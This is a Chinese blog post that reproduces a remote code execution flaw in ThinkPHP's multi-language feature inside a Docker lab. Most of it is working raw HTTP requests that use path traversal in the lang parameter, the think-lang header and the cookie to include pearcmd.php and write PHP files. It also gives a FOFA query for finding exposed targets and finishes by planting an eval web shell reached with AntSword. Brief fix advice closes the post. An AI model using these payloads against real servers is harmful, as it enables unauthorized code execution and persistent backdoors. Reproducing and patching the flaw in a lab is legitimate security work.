多语言模块文件包含RCE复现

[ 顶峰相见8号](https://www.jianshu.com/u/619fee1a6ee1)关注赞赏支持

# 多语言模块文件包含RCE复现

## 漏洞描述：

ThinkPHP在开启多语言功能的情况下存在文件包含漏洞，攻击者可以通过get、header、cookie等位置传入参数，实现目录穿越+文件包含，通过pearcmd文件包含这个trick即可实现RCE。

## 影响版本：

    
    
    6.0.1 < ThinkPHP≤ 6.0.13
    
    5.0.0 < ThinkPHP≤ 5.0.12
    
    5.1.0 < ThinkPHP≤ 5.1.8
    

## 利用条件：

> 1、需要Thinkphp开启多语言功能  
>  2、安装pear扩展  
>  3、知道pearcmd.php路径  
>  4、register_argc_argv=on

## FOFA搜索语法：

    
    
    > header="think_lang"
    

## 环境搭建：

服务器首先要有docker环境，没有的可以先部署一个

#### 1、docker直接拉取vulfocus 的thinkphp:6.0.12的漏洞环境镜像：

    
    
    docker pull vulfocus/thinkphp:6.0.12
    

#### 2、启动容器，将容器的80端口映射到本机的80端口

    
    
    docker run  --nametp123 -p80:80 -d镜像id
    

>
> [【一一帮助安全学习，所有资源获取处一一】](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDV3RvY2ZFSFp6UENh)  
>  ①网络安全学习路线  
>  ②20份渗透测试电子书  
>  ③安全攻防357页笔记  
>  ④50份安全攻防面试指南  
>  ⑤安全红队渗透工具包  
>  ⑥网络安全必备书籍  
>  ⑦100个漏洞实战案例  
>  ⑧安全大厂内部视频资源  
>  ⑨历年CTF夺旗赛题解析

浏览器访问：`ip+/public/index.php` 如下图则搭建成功：

图片.png

## 漏洞复现：

进入容器查看pearcmd.php路径，执行

    
    
    find / -name pearcmd.php 2>/dev/null
    
    
    
    /usr/local/lib/php/pearcmd.php
    

图片.png

### EXP：

##### 在/tmp/下生成hello.php

    
    
    GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    think-lang:../../../../../../../../usr/local/lib/php/pearcmd
    Cookie: think_lang=zh-cn
    Connection: close
    

##### 进入容器查看/tmp/hellp.php

图片.png

##### 包含hello.php

    
    
    GET /public/index.php HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    think-lang:../../../../../../../../tmp/hello
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 看看浏览器页面成功执行phpinfo：

图片.png

### GET：

直接利用p牛文章中的请求包，需要根据实际情况改变文件名称，写不进去可以考虑多加点../

##### 创建文件

    
    
    GET
    
    /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php
     HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 进入容器查看：

图片.png

##### 文件包含/tmp/1.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 再看看浏览器页面，成功执行phpinfo：

图片.png

### HEADER：

##### 创建文件

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/2.php HTTP/1.1
    Host: 192.168.36.128
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    think-lang:../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 进入容器查看：

图片.png

##### 文件包含/tmp/2.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/2 HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 在看看浏览器页面成功执行phpinfo：

图片.png

## COOKIES：

##### 创建文件

    
    
    GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/3.php HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
    Connection: close
    

##### repeater发包：

图片.png

##### 进入容器查看：

图片.png

##### 文件包含/tmp/3.php

    
    
    GET /public/index.php?lang=../../../../../../../../../../../../tmp/3 HTTP/1.1
    Host: 192.168.36.128
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Sec-Purpose: prefetch;prerender
    Purpose: prefetch
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 在看看浏览器页面成功执行phpinfo：

图片.png

### GETSHELL

#### 于是我梅开二度决定写入一个马子试试：

这次我们直接写到网站根目录（注：phpinfo可以查看网站绝对路径）

图片.png

##### 写入文件

    
    
    GET
    
    /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php
     HTTP/1.1
    Host: 192.168.36.128
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
    Accept:
    
    text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: think_lang=zh-cn
    Connection: close
    

##### repeater发包：

图片.png

##### 浏览器访问：

图片.png

##### 蚁剑成功连接：

图片.png

## 修复建议：

1、若无必要，可关闭多语言功能，可参考文档

[https://www.kancloud.cn/manual/thinkphp6_0/1037637](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.kancloud.cn%2Fmanual%2Fthinkphp6_0%2F1037637)

[https://static.kancloud.cn/manual/thinkphp5/118132](https://links.jianshu.com/go?to=https%3A%2F%2Fstatic.kancloud.cn%2Fmanual%2Fthinkphp5%2F118132)

2、官方已发布6.0.14、5.1.42，建议升级至安全版本

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [phpcms前台注册模块，任意文件上传复现](https://www.jianshu.com/p/04482490b53e)

参考：https://www.cnblogs.com/s1ye/p/8459316.html https:/...

[白小黑](https://www.jianshu.com/u/a1a64b73658b)阅读 89评论 0赞 0

  * [根据模型进行字段的增添与查找，视图中根据模块引擎输出前端](https://www.jianshu.com/p/a522f0f95093)

一、引用模型 （一）新建模型 1、运行thinkphp 进入tp，打开cmd，输入php think run，运行...

[Clover_9fd3](https://www.jianshu.com/u/a954d95c780f)阅读 265评论 0赞 5

  * [1-1](https://www.jianshu.com/p/4940e1881c02)

理工寝室商店-微信小程序 疑问小结 当时在XAMMP下mysql目录下的bin下 php -v 不起作用.到ph...

[这个超人不会飞阿](https://www.jianshu.com/u/a39a6b5249c2)阅读 1,496评论 1赞 1

  * [PHP文件包含](https://www.jianshu.com/p/b645a93c371a)

LFI、RFI、PHP封装协议安全问题学习 本文希望分享一些本地文件包含、远程文件包含、PHP的封装协议(伪协议)...

[Otis4631](https://www.jianshu.com/u/610b627245b6)阅读 2,204评论 0赞 0

  * [ThinkPHP和Workerman整合实现Socket通信Demo](https://www.jianshu.com/p/668ac301f9ca)

因为最近有个项目涉及到Socket通信，于是自己尝试了一下搭建一个服务端WebSocket通信的项目，写个笔记，能...

[JonsonHamilton](https://www.jianshu.com/u/19615e9a581f)阅读 37,170评论 11赞 20

 